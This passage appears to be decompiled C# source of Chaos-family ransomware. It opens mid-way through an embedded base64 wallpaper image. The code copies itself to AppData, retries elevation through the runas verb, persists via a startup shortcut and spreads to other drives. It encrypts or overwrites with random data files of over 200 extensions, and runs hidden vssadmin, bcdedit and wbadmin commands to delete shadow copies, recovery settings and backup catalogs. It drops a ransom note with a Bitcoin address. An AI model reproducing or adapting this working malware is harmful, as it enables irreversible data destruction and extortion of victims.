z2N9Og5wlLOlbk3uc/k5/XM+2efLmfVZv2EMkv415m3cu/Xs+2eXLkPQcFi66jPRy/jXmS8M3I6nUdUp5QQfaJJy5gYBGtyoS1TSRbw/7KpCpKSsu3quSRiJc/SfHaB/jRoPrRedOEBYy6I3/mM0ptdv/t6nGniCWtbcwx53n/4B+JPqjir397kKdebgorWyl/IdMXiyS5k2h9t16NufFIwWjJV8VNuVO+lnp/lO+NrTTfJu17AL3IOV1/U3HPgoQVpKxZxM3OjLM9YuNvGz9/0I2fxM/wC2P/XV5/h/XYtipKTVSP8A4r+WRzZUkTxbW/8AUziTw4rNvsaVJqPep/yo71MYX0y1roylxPK74Nvm+ICbgb43wULSuWZYp1aGRPa/3t4a78uwjUtoOIcH1Bma2GEZSCQTqcp39LKTgk9EaY4yck1OdmlZba/IjsxdY/Pb9lv+1TyxKjrVecl5L0MmvW+k37LOfLl7wmVEOnqda8l6GjMZUJjOwbpLWxqB9HS8+RTKiUa1S/6l5L0NcftB9QBrssNJMgak75O7l/SEYJamcRi51oqEraEFTKgQBAEAQBAEBIZSbMTOu7ggNRRETOsxMbvNAZdQA1N7Wtv4XQA0BcA3iY/BAcqjYMawgNUAQBAZaJMICxMtgCI05zCA0pOkFpnz6XQEWkyQRv3figPQY/aLHCple45y3K17Wljcuurjr0WiNNpo7eJ4jCcJ5W3mtZNaK2/N7lNXeXZQ4iwsGtAEE7o3rclY5E6jna/yLHCUwH1XZmDJB8WUAnxCw0O60XUJa2LtD4XN3V116dZxa8sY14qtzEuaWgAeEBrb9couL3Rxvo0RjXlTgpwnq7prs09BUqNqVC5stDmuseVMiZ4WSMcsbMjWrxq1pTirKz0/ynDGvqPaXvuZaCcuntRePzIWYxUdERr1quIvVnrayvY6YGs6tVaHuHhY4AmAIykR71iSUVobaM6mJqpTlsmlfTka4Ou9/hNwynVi2mZjpuOcLLSWprpTqVfg3SUvmiDTrOa7MCQ7jvvqpNXKsZyi8yepMobVeCc8PBBaQba21Ci4J7FujjZQbzrMmmrd5KxeKDmMysDQxsRJNiZsT1WYxtchicTGsoqMcqirb353IrXkOgzf05KRVIxYM5Hp13IDPcCOECT56aoDU0QNXb4HBAbGiDAB3SfzKAwKAve1uG/zQGO6EEzp6HogMVKMCZ6c96A5IAgOhrO46IB3zuKACs7igNmVzMm5GiA5EoDCAIAgCAmtrhwEmCEBh9cAEAyTvQEVjiLhAZbUI0KAy2s4RBNtPK4Qym07o6YjGve4vc6XHU2usJWVkSqVJVJOct2cxVPHVZIEnBYwNcS9ucZSImNREz0JHmoyTexvw9WFOTc430a8zg/EuIIzHKTJbJgxpZZsr3NaqTUXC+j5HJZIHShiHMktcRIgxwOqw4p7mynWnTu4O19DksmsICVRrjLld6oDp3rW3nMUBDc4kzv1QGRVMzNygAqu46oAKptfRAO9dMygM987SUAq1JgbggOaAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAID//2Q==";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $100M. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 100m $", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
